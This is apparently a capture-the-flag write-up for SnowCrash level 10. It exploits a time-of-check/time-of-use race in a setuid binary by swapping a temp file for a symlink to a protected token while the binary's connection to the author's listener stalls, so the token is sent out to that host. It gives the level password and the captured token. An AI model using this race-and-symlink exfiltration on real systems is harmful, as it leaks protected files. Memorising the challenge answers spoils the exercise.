> [!TIP]
> user: `level10` <br>
> pass: `s5cAJpM8ev6XHw998pRWG728z`

in the home directory we have a binary `level10` owned by `flag10` and with suid, along with a file `token` owned by `flag10` and readable only by him.
launching the level10 binary, it takes two args: a file and a server
we setup a netcat and start the program, it dont work so we try with a temp file, it works

on the snowcrash machine:
```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ ./level10 token 10.13.2.6
You don't have access to token
level10@SnowCrash:~$ echo 'test' > /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ 
```

on our machine: 
```bash
➜ nc -llvp 6969
Listening on 0.0.0.0 6969
Connection received on 10.13.249.44 44114
.*( )*.
test
```

okay so it should check for rights, then connect, open file and send it. lets check that with strace:

```bash
level10@SnowCrash:~$ strace ./level10 /tmp/test 10.13.2.6
execve("./level10", ["./level10", "/tmp/test", "10.13.2.6"], [/* 18 vars */]) = 0
[...]
access("/tmp/test", R_OK)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "Connecting to 10.13.2.6:6969 .. ", 32Connecting to 10.13.2.6:6969 .. ) = 32
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("10.13.2.6")}, 16) = 0
write(3, ".*( )*.\n", 8)                = 8
write(1, "Connected!\n", 11Connected!)            = 11
write(1, "Sending file .. ", 16Sending file .. )        = 16
open("/tmp/test", O_RDONLY)             = 4
read(4, "test\n", 4096)                 = 5
write(3, "test\n", 5)                   = 5
write(1, "wrote file!\n", 12wrote file!)           = 12
exit_group(12)                          = ?
```

its eaxctly that! 

1. call `access(path, R_OK)`
1. create a `socket()` and `connect(host, 6969)`
1. call `open(path, O_RDONLY)`, `read()`, and `write()` to socket!

here's the plan:

1. create `/tmp/test` exactly like before 
1. create a rogue server that will block the client socket when connecting
1. launch the server and launch the binary
1. connection will hang, quickly `rm /tmp/test && ln -s $PWD/token /tmp/test`
1. client should send content of the token file

the server is attached, but heres how we exploited it:

1. launch server
2. launch the binary multiple times until the tcp buffer is full
3. `rm /tmp/test && ln -s $PWD/token /tmp/test`
4. read from the server
5. profit

on the vm:
```bash
level10@SnowCrash:~$ touch /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. Connected!
Sending file .. wrote file!
level10@SnowCrash:~$ ./level10 /tmp/test 10.13.2.6
Connecting to 10.13.2.6:6969 .. <<<<===== it blocked here!
Connected!
Sending file .. wrote file!
level10@SnowCrash:~$
```

on a second terminal while the process hanged:
```bash
rm /tmp/test && ln -s $PWD/token /tmp/test
```

and on the host:
```bash
➜ ./a.out
Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client:
Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client: Received: .*( )*.

Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client:
Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client: Received: .*( )*.

Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client:
Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client: Received: .*( )*.

Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client:
Waiting for a client to connect...
Client connected!
Press enter to receive a message or 'q' to wait for another client: Received: .*( )*.
woupa2yuojeeaaed06riuj63c
```